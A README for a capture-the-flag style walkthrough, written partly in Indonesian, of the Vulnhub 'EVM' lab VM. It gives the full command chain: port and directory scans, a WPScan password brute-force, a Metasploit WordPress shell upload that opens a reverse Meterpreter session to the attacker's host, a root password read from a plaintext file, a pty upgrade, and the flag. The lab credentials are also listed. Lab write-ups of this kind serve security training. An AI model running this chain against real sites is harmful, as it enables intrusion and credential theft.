[README.md](https://github.com/user-attachments/files/26491929/README.md)
# 🔐 VM EVM — Penetration Testing Walkthrough

> **Platform:** Vulnhub.com  
> **Difficulty:** Easy / Beginner Friendly  
> **OS Target:** Ubuntu 16.04 LTS  
> **Web Stack:** Apache 2.4.18 + WordPress 5.2.4  
> **Goal:** WordPress Admin Access → Root Shell → FLAG  
> **Status:** ✅ ROOTED — `voila you have successfully pwned me :D`

---

## ⚠️ Disclaimer

> Seluruh aktivitas dalam repository ini dilakukan pada VM lab virtual yang terisolasi dari Vulnhub.com untuk keperluan **pembelajaran ethical hacking**. Jangan gunakan teknik ini pada sistem tanpa izin tertulis.

---

## 📁 Struktur Repository

```
vm-evm-pentest/
├── README.md                  # Overview & quick reference (file ini)
├── docs/
│   ├── 01-recon.md            # Nmap + Nessus scan
│   ├── 02-web-enum.md         # dirb + WPScan enumeration
│   ├── 03-exploitation.md     # WPScan brute-force + Metasploit
│   ├── 04-post-exploitation.md# Meterpreter → root
│   └── 05-recommendations.md  # WordPress & server hardening
├── scripts/
│   ├── recon.sh               # Automated recon script
│   └── wp_enum.sh             # WordPress enumeration helper
├── wordlists/
│   └── note.md                # Catatan wordlist yang digunakan
├── nessus/
│   └── scan_summary.md        # Ringkasan hasil Nessus scan
└── screenshots/               # (tempatkan screenshot di sini)
```

---

## 🗺️ Attack Flow Summary

```
[Nmap -A -p-]
     ↓ Port 80: Apache + WordPress
[Nessus Scan]
     ↓ 33 vulns, 1 Critical
[dirb http://TARGET/]
     ↓ /wordpress/ directory found
[WPScan -e u]
     ↓ User: c0rrupt3d_brain
[WPScan brute-force + rockyou.txt]
     ↓ Password: 24992499  (~4 menit)
[Metasploit: wp_admin_shell_upload]
[LHOST = IP Kali Linux]
     ↓ Meterpreter session (www-data)
[cat /home/root3r/.root_password_ssh.txt]
     ↓ Password root: willy26
[python pty upgrade + su root]
     ↓ ROOT SHELL 🎉
[cat /root/proof.txt]
     → FLAG: voila you have successfully pwned me :D
```

---

## 🚀 Quick Start

### 1. Setup Lab
```bash
# Import VM EVM ke VirtualBox/VMware
# Setting Network: Host-Only Adapter
# Jalankan VM EVM + Kali Linux
```

### 2. Recon
```bash
nmap -A -p- 192.168.56.103
```

### 3. Web Directory Enumeration
```bash
dirb http://192.168.56.103/
# Temukan: /wordpress/ directory
```

### 4. WordPress Enumeration
```bash
wpscan --url http://192.168.56.103/wordpress/ -e at -e ap -e u
# Temukan: user c0rrupt3d_brain, WP 5.2.4, XML-RPC enabled
```

### 5. WordPress Brute-Force
```bash
wpscan --url http://192.168.56.103/wordpress/ \
       -U c0rrupt3d_brain \
       -P /usr/share/wordlists/rockyou.txt
# Result: c0rrupt3d_brain / 24992499
```

### 6. Metasploit Exploitation
```bash
msfconsole
use exploit/unix/webapp/wp_admin_shell_upload
set RHOST    192.168.56.103
set TARGETURI /wordpress
set USERNAME  c0rrupt3d_brain
set PASSWORD  24992499
set LHOST    192.168.56.102   # ← IP KALI LINUX (bukan loopback!)
set LPORT    5555
exploit
# → meterpreter >
```

### 7. Post-Exploitation
```bash
meterpreter > cd /home/root3r
meterpreter > cat .root_password_ssh.txt
# → willy26

meterpreter > shell
$ python -c 'import pty;pty.spawn("/bin/bash")'
$ su root
Password: willy26
# → root shell!
```

### 8. Get FLAG
```bash
cat /root/proof.txt
```

---

## 🔑 Credentials Found

| Service | Username | Password | Source |
|---------|----------|----------|--------|
| WordPress Admin | c0rrupt3d_brain | 24992499 | WPScan brute-force (rockyou.txt) |
| OS Root | root | willy26 | Plaintext file: .root_password_ssh.txt |

---

## 🔍 Findings Summary

| ID | Severity | Finding |
|----|----------|---------|
| VULN-001 | 🔴 CRITICAL | WordPress Admin Shell Upload (Metasploit) |
| VULN-002 | 🔴 CRITICAL | Root Password Stored in Plaintext File |
| VULN-003 | 🟠 HIGH | WordPress User Enumeration |
| VULN-004 | 🟠 HIGH | Weak WordPress Admin Password |
| VULN-005 | 🟡 MEDIUM | WordPress 5.2.4 Outdated |
| VULN-006 | 🟡 MEDIUM | XML-RPC Enabled |
| VULN-007 | 🟡 MEDIUM | Upload Directory Listing Enabled |

---

## ⚠️ Lesson Learned — Common Mistakes

### LHOST Error di Metasploit
```
❌ SALAH: set LHOST 127.0.0.1  (loopback — target tidak bisa balik ke sini)
❌ SALAH: set LHOST 192.168.56.101  (IP VMBox, bukan Kali)
✅ BENAR: set LHOST 192.168.56.102  (IP Kali Linux)
```
**Cara cek IP Kali:** `ip a` atau `ifconfig` — cari interface yang ada di subnet yang sama dengan target.

### Shell Upgrade
```bash
# Dari meterpreter shell yang terbatas:
python -c 'import pty;pty.spawn("/bin/bash")'
# atau
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

## 📄 Full Report

Laporan pentest lengkap tersedia di: `pentest_report_vm_evm.docx`

---

*Dibuat untuk keperluan belajar ethical hacking — Lab VM EVM (Vulnhub)*
